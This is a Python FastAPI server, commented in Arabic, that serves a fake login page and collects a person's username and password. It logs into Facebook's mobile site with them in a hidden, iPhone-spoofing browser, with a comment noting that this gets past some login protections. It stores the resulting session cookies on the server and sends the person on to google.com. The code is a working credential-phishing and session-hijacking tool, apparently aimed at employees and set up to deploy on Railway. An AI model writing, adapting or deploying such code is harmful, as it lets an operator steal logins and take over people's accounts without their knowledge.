from fastapi import FastAPI, Request, Form
from fastapi.responses import HTMLResponse, RedirectResponse, JSONResponse
from fastapi.templating import Jinja2Templates
from playwright.sync_api import sync_playwright
import uvicorn
import os

app = FastAPI()
templates = Jinja2Templates(directory="templates")

# 🔗 ضع هنا الرابط الذي تريد توجيه الموظف إليه بعد انتهاء التسجيل بنجاح
REDIRECT_TARGET_URL = "https://www.google.com" 

@app.get("/", response_class=HTMLResponse)
async def login_page(request: Request):
    return templates.TemplateResponse("login.html", {"request": request})

@app.post("/api/start-session")
async def start_session(username: str = Form(...), password: str = Form(...)):
    # تنظيف اسم المستخدم لإنشاء اسم ملف آمن
    safe_username = username.replace("@", "_").replace(".", "_")
    session_filepath = f"sessions/{safe_username}_session.json"
    
    try:
        with sync_playwright() as p:
            # تشغيل المتصفح المخفي (Headless) للعمل على السيرفر بأقل استهلاك CPU
            browser = p.chromium.launch(headless=True)
            context = browser.new_context(
                user_agent="Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1"
            )
            page = context.new_page()
            
            # فتح نسخة الموبايل من فيسبوك لأنها خفيفة وتتخطى بعض حمايات تسجيل الدخول
            page.goto("https://m.facebook.com/")
            
            # تعبئة البيانات
            page.fill("input[name='email']", username)
            page.fill("input[name='pass']", password)
            page.click("button[name='login']")
            
            # انتظار استجابة الصفحة بعد الضغط (5 ثوانٍ كحد أقصى)
            page.wait_for_timeout(5000)
            
            # حفظ الجلسة والكوكيز في المجلد الدائم على السيرفر
            context.storage_state(path=session_filepath)
            
            browser.close()
            
        # بعد النجاح، يتم توجيه المستخدم تلقائياً للرابط المطلوب
        return RedirectResponse(url=REDIRECT_TARGET_URL, status_code=303)

    except Exception as e:
        # في حالة حدوث خطأ يتم عرضه على الشاشة
        return JSONResponse(content={
            "status": "error",
            "message": f"حدث خطأ أثناء المزامنة: {str(e)}"
        }, status_code=500)

if __name__ == "__main__":
    # قراءة البورت الديناميكي الموفر من Railway تلقائياً
    port = int(os.environ.get("PORT", 8000))
    uvicorn.run(app, host="0.0.0.0", port=port)
